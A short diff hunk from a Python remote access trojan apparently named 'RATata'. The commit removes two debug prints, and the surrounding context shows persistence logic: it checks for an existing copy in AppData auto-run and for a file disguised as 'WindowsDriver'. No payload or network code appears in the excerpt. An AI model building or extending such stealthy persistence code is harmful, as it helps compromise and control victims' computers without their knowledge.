@@ -51,9 +51,7 @@ except:
 path_User = f'''C:/Users/{user}/'''
 
 # checking if an other RATata is already in auto-run
-print(THIS_FOLDER)                      #######
 if "AppData" in THIS_FOLDER:
-    print("logic")                    #######
     if not "WindowsDriver" in ffname:
         print("got one")
         path_User = str(path_User) + str(ffname)
